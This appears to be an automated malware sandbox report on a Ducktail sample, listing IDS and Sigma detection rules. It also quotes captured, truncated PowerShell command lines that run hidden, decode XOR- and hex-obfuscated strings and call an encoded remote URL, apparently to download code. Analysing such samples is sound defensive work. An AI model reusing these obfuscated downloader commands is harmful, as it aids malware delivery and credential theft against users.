exiftool.Flags: WorkingDir, CommandArgs, IconFile, Unicode, ExpString, ExpIcon

crowdsourced_ids_results.rule_category: Malware Command and Control Activity Detected
crowdsourced_ids_results.rule_msg: ET MALWARE Ducktail CnC Activity - Begin Download Command (POST)
crowdsourced_ids_results.rule_raw: alert http $HOME_NET any -> $EXTERNAL_NET any (msg:"ET MALWARE Ducktail CnC Activity - Begin Download Command (POST)"; flow:established,to_server; http.method; content:"POST"; http.uri; pcre:"/^\x2f[a-z0-9]{96}$/"; urilen:97; http.user_agent; content:"WindowsPowerShell/"; http.content_type; bsize:16; content:"application/json"; http.request_body; content:"|5b|"; startswith; content:"|22 5c 22|begin|20|download|20|http"; fast_pattern; content:"|22 2d 2d 2d 2d 2d 2d 2d 2d 2d 2d 22 0d 0a 5d|"; endswith; reference:md5,19df486249801c08f0efde6a16e135ee; reference:url,x.com/suyog41/status/1875174914128310378; classtype:command-and-control; sid:2058892; rev:1; metadata:affected_product Windows_XP_Vista_7_8_10_Server_32_64_Bit, attack_target Client_Endpoint, tls_state plaintext, created_at 2025_01_03, deployment Perimeter, confidence High, signature_severity Major, tag c2, tag Ducktail, updated_at 2025_01_03, mitre_tactic_id TA0011, mitre_tactic_name Command_And_Control, mitre_technique_id T1071, mitre_technique_name Application_Layer_Protocol;)

crowdsourced_ids_results.rule_category: Malware Command and Control Activity Detected
crowdsourced_ids_results.rule_msg: ET MALWARE Ducktail Host Profile Exfiltration (POST)

crowdsourced_ids_results.rule_msg: ET INFO Windows Powershell User-Agent Usage
crowdsourced_ids_results.rule_raw: alert http $HOME_NET any -> $EXTERNAL_NET any (msg:"ET INFO Windows Powershell User-Agent Usage"; flow:established,to_server; http.user_agent; content:"Mozilla/"; startswith; content:") WindowsPowerShell/"; distance:0; fast_pattern; classtype:not-suspicious; sid:2033355; rev:1; metadata:attack_target Client_Endpoint, created_at 2021_07_16, deployment Perimeter, confidence High, signature_severity Informational, tag Description_Generated_By_Proofpoint_Nexus, updated_at 2021_07_16;)

sigma_analysis_results.rule_description: Detects usage of the "FromBase64String" function in the commandline which is used to decode a base64 encoded string

match_context.values: @{Hashes=MD5=04029E121A0CFA5991749937DD22A1D9,SHA256=9F914D42706FE215501044ACD85A32D58AAEF1419D404FDDFA5D3B48F66CCD9F,IMPHASH=7C955A0ABC747F57CCC4324480737EF7; CurrentDirectory=C:\Users\Bruno\Desktop\; OriginalFileName=PowerShell.EXE; Product=Microsoft\xae Windows\xae Operating System; Description=Windows PowerShell; EventID=1; ParentCommandLine="C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" -enc  [TRUNCATED]; CommandLine="C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" -NoProfile -w hidden -Command "$dATA = ([TExt.EncodIng]::UTF8.GEtSTrInG((&((-join([Convert]::FromBase64String('j8SJj8WJj8aJ')|%%{[char]($_ -bxor 244)})) -f [char]((0x49)),[char]((0x57)),[char]((0x52))) (-join ([regex]::Matches(\"EFF3F3F7F4BDA8A8EDE8E5E3E2F4E4F5EEF7F3EEE8E9E5E8E8EFE8E8A9E4E8EAA8F3A8E6B1E1B6B3E4B0BEE4B4B4B7B5E3E2E5E4E3B6B4E4E2B4B1E5B4B6B4B0B1B7E2B3BEE2B6B4B1B2B4E2E4E6E4B0B7B7B4B3B6E2E3E1B2B0E6B3B5E2E3B5B2E3B4\", \"..\") | [TRUNCATED]; FileVersion=10.0.19041.546 (WinBuild.160101.0800); ParentImage=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe; IntegrityLevel=High; Image=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe; Company=Microsoft Corporation}

sigma_analysis_results.rule_description:
Adversaries may use hidden windows to conceal malicious activity from the plain sight of users.
In some cases, windows that would typically be displayed when an application carries out an operation can be hidden

match_context.values: @{ScriptBlockText=Start-Process -FilePath "powershell.exe" -WindowStyle Hidden  -ArgumentList '-NoProfile -w hidden -Command "$dATA = ([TExt.EncodIng]::UTF8.GEtSTrInG((&((-join([Convert]::FromBase64String(''j8SJj8WJj8aJ'')|%{[char]($_ -bxor 244)})) -f [char]((0x49)),[char]((0x57)),[char]((0x52))) (-join ([regex]::Matches(\"EFF3F3F7F4BDA8A8EDE8E5E3E2F4E4F5EEF7F3EEE8E9E5E8E8EFE8E8A9E4E8EAA8F3A8E6B1E1B6B3E4B0BEE4B4B4B7B5E3E2E5E4E3B6B4E4E2B4B1E5B4B6B4B0B1B7E2B3BEE2B6B4B1B2B4E2E4E6E4B0B7B7B4B3B6E2E3E1B2B0E6B3B5E2E3B5B [TRUNCATED]; Path=; ScriptBlockId=ad2a9940-ee2e-48a5-9e8c-ad69e300399e; MessageTotal=1; MessageNumber=1; EventID=4104}

@{ScriptBlockText=Start-Process -FilePath "powershell.exe" -WindowStyle Hidden  -ArgumentList '-NoProfile -w hidden -Command "$dATA = ([TExt.EncodIng]::UTF8.GEtSTrInG((&((-join([Convert]::FromBase64String(''j8SJj8WJj8aJ'')|%{[char]($_ -bxor 244)})) -f [char]((0x49)),[char]((0x57)),[char]((0x52))) (-join ([regex]::Matches(\"EFF3F3F7F4BDA8A8EDE8E5E3E2F4E4F5EEF7F3EEE8E9E5E8E8EFE8E8A9E4E8EAA8F3A8E6B1E1B6B3E4B0BEE4B4B4B7B5E3E2E5E4E3B6B4E4E2B4B1E5B4B6B4B0B1B7E2B3BEE2B6B4B1B2B4E2E4E6E4B0B7B7B4B3B6E2E3E1B2B0E6B3B5E2E3B5B [TRUNCATED]; MessageTotal=1; ScriptBlockId=4de2fa4a-cb94-4c04-bd05-18375c363773; Path=; EventID=4104; MessageNumber=1}

sigma_analysis_results.rule_title: Usage Of Web Request Commands And Cmdlets - ScriptBlock
sigma_analysis_results.rule_description: Detects the use of various web request commands with commandline tools and Windows PowerShell cmdlets (including aliases) via PowerShell scriptblock logs

sigma_analysis_results.rule_title: Suspicious Execution of Powershell with Base64

sigma_analysis_results.rule_description: Detects specific combinations of encoding methods in PowerShell via the commandline

sigma_analysis_results.rule_description: Detects non-interactive PowerShell activity by looking at the "powershell" process with a non-user GUI process such as "explorer.exe" as a parent.

sigma_analysis_results.rule_title: PowerShell Script With File Upload Capabilities
sigma_analysis_results.rule_description: Detects PowerShell scripts leveraging the "Invoke-WebRequest" cmdlet to send data via either "PUT" or "POST" method.
Get the processes that are running on the local computer.

sigma_analysis_results.rule_title: Potential PowerShell Obfuscation Using Alias Cmdlets
sigma_analysis_results.rule_description: Detects Set-Alias or New-Alias cmdlet usage. Which can be use as a mean to obfuscate PowerShell scripts

match_context.values: @{ScriptBlockText=Set-Alias -Name gcim -Value Get-CimInstance -Option ReadOnly, AllScope -ErrorAction SilentlyContinue; MessageTotal=1; ScriptBlockId=3eb0b02b-58fd-49f2-a2f1-5ac363c6f751; Path=; EventID=4104; MessageNumber=1}

@{ScriptBlockText=Set-Alias -Name scim -Value Set-CimInstance -Option ReadOnly, AllScope -ErrorAction SilentlyContinue; Path=; ScriptBlockId=81f7d157-23b0-4dc6-8a45-ddbce2f56724; MessageTotal=1; MessageNumber=1; EventID=4104}

@{ScriptBlockText=Set-Alias -Name ncim -Value New-CimInstance  -Option ReadOnly, AllScope -ErrorAction SilentlyContinue; MessageTotal=1; ScriptBlockId=0aeb9a81-7bff-40fb-8089-b2991c8d49b7; Path=; EventID=4104; MessageNumber=1}

@{ScriptBlockText=Set-Alias -Name rcim -Value Remove-cimInstance -Option ReadOnly, AllScope -ErrorAction SilentlyContinue; Path=; ScriptBlockId=4c0966f9-49dc-4402-8d0f-c7e598dbf306; MessageTotal=1; EventID=4104; MessageNumber=1}

@{ScriptBlockText=Set-Alias -Name icim -Value Invoke-CimMethod -Option ReadOnly, AllScope -ErrorAction SilentlyContinue; Path=; ScriptBlockId=4c4d0b1b-4acb-4378-b09c-3d4d33931023; MessageTotal=1; MessageNumber=1; EventID=4104}

sigma_analysis_results.rule_description: Detects the use of PowerShell to identify the current logged user.

threat_severity.level_description: Severity HIGH because it was considered trojan. Other contributing factor was that it could not be run in sandboxes.
